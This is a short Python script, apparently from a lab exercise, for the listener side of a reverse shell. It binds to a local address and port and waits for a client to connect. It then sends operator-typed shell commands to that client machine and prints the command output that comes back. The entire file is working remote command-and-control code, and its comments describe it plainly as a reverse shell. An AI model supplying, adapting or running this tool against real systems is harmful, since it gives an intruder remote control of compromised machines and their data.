import socket


class Connection():
    def __init__(self):
        """Initializing a Connection object creates a
        socket with a client and then creates a reverse
        shell. Once the shell is set up, the server sends
        shell commands to the client machine. The client
        machine executes the shell commands and sends its
        stdout and stderr character streams back to the
        server, which prints them to the screen. It is
        not limited to 1024 character chunks from the
        client's machine but will continue printing until
        the stdout and stderr buffers are emptied out on
        the client's machine.
        """
        self.initiate_connection()
        self.reverse_shell()

    def initiate_connection(self):
        """Creates socket object, binds it to an ip
        address and port, listens for 1 client, and
        accepts a connection from the client.
        """
        self.s = socket.socket(
            socket.AF_INET,
            socket.SOCK_STREAM
                              )
        self.s.bind(("10.0.2.15", 8080))
        self.s.listen(1)
        print("Listening on port 8080")
        self.conn, self.addr = self.s.accept()
        print(f"Connected to {self.addr}")

    def reverse_shell(self):
        """Asks for command to send to the shell on
        client connection. Sends command. The client's
        code executes those commands, generated stdout
        and stderr. Client sends its stdout and stderr
        back to server. Server receives packets and
        prints them to the screen until the string
        "THAT'S ALL, F0LKS!!!" (with a zero) is received,
        then prints "DONE" and asks for another command.
        """
        while True:
            command = input("Shell> ")
            if 'terminate' in command:
                self.conn.send('terminate'.encode())
                self.s.close()
                break
            else:
                self.conn.send(command.encode())
                received_string = (
                    "\n"
                    + self.conn.recv(1024).decode()
                                  )
                while (
                    "THAT'S ALL, F0LKS!!!" not in received_string
                      ):
                    print(received_string)
                    received_string = self.conn.recv(
                                                    1024
                                                    ).decode()
                print("DONE\n")


if __name__ == "__main__":
    connection = Connection()
